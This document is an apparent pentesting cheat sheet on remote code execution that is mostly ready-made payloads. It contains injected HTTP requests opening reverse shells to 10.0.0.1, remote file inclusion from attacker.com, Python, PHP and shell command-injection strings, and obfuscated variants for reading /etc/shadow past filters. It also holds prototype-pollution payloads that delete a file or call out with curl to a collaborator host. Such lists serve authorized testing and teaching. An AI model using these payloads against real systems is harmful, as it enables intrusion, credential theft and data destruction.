### Remote Code Execution (RCE) and Payloads

Remote Code Execution (RCE) is a critical security concern that arises when attackers can execute arbitrary code on a target machine due to vulnerabilities or misconfigurations. RCE can be achieved through various techniques such as SQL Injection (SQLi), Server-Side Template Injection (SSTI), and insecure deserialization.

**Code Injection Examples:**

- Code injection using query parameter:
  ```http
  GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
  Host: example.com
  ```

- Code injection using a download URL:
  ```http
  GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
  Host: example.com
  ```

- File inclusion vulnerability:
  ```http
  http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
  ```

**Payloads for RCE:**

- Python payloads:
  - To print a message if Python execution succeeds:
    ```
    print("RCE test!")
    ```
  - To execute the system command 'ls':
    ```
    "__import__('os').system('ls')"
    ```
  - To delay the response for 10 seconds:
    ```
    "__import__('os').system('sleep 10')"
    ```

- PHP payloads:
  - To display local PHP configuration information:
    ```
    phpinfo();
    ```
  - To execute the system command 'ls':
    ```
    <?php system("ls");?>
    ```
  - To delay the response for 10 seconds:
    ```
    <?php system("sleep 10");?>
    ```

- Unix payloads:
  - To execute the system command 'ls':
    ```
    ;ls;
    ```
  - Payloads to delay the response for 10 seconds:
    ```
    | sleep 10;
    & sleep 10;
    ` sleep 10;`
    $(sleep 10)
    ```

**Filter Bypass Techniques:**

- Various techniques to bypass filters:
  - Manipulating `/etc/shadow` to avoid filters:
    ```
    cat /etc/shadow
    cat "/e"tc'/shadow'
    cat /etc/sh*dow
    cat /etc/sha``dow
    cat /etc/sha$()dow
    cat /etc/sha${}dow
    ```

- PHP filter bypass:
  - Executing a system command by concatenating strings:
    ```
    ('sys'.'tem')('cat /etc/shadow');
    system/**/('ls');
    ```

- Python filter bypass:
  - Using different syntax variations:
    ```
    __import__('os').system('cat /etc/shadow')
    __import__('o'+'s').system('cat /etc/shadow')
    __import__('\x6f\x73').system('cat /etc/shadow')
    ```

- Splitting RCE payloads to bypass input validation:
  ```
  GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
  Host: example.com
  ```

- Bypassing using prototype pollution:
  ```json
  "__proto__": {
      "execArgv":[
          "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
      ]
  }
  "__proto__": {
      "execArgv":[
          "--eval=require('child_process').execSync('curl https://<your web server>')"
      ]
  }
  "__proto__": {
      "shell":"vim",
      "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
  }
  ```

These are various techniques, payloads, and bypasses related to RCE vulnerabilities. Properly testing for and addressing RCE vulnerabilities is crucial to maintaining web application security. It's important to responsibly disclose and mitigate such issues to prevent potential attacks.
